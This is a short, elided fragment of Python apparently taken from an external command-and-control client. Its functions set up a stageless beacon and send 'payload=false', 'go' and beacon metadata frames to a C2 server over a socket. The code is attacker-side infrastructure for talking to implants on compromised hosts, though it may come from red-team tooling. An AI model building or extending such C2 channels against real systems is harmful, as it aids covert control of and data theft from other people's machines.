...
# Stagless 
def requestStagless(sock):
	commonUtils.sendFrameToC2(sock, "payload=false")
	if config.debug:
		print( commonUtils.color("payload=false", status=False, yellow=True))
	commonUtils.sendFrameToC2(sock, "go")
	if config.debug:
		print( commonUtils.color("stagless configured, sending 'go'", status=False, yellow=True))

	return 0

def loadStagless(sock, beaconId):
	# # Send options to the external_c2 server
	requestStagless(sock)
	...
	if config.verbose:
		print( commonUtils.color("Sending metadata to c2 server"))
	if config.debug:
		print( (commonUtils.color("METADATA: ", status=False, yellow=True) + str(metadata)))
	commonUtils.sendFrameToC2(sock, metadata)
